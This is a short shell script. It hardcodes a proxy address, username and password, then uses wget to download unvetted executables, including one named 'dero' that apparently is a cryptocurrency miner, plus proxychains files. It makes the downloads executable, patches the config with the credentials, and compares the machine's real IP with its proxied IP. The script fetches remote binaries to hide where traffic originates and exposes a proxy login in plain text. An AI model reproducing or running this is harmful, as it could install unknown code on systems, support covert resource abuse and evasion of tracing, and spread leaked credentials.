proxy="45.155.69.201" 
port="6406" 
user="ingfoingfo"  
pass="maszZeehh"
wget https://github.com/angkii/m/raw/main/dero && chmod +x dero
wget https://github.com/amit12986/code/raw/main/panel && chmod +x panel 
wget https://github.com/amit12986/code/raw/main/proxychains.conf && chmod +x proxychains.conf 
wget https://github.com/amit12986/code/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 3 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
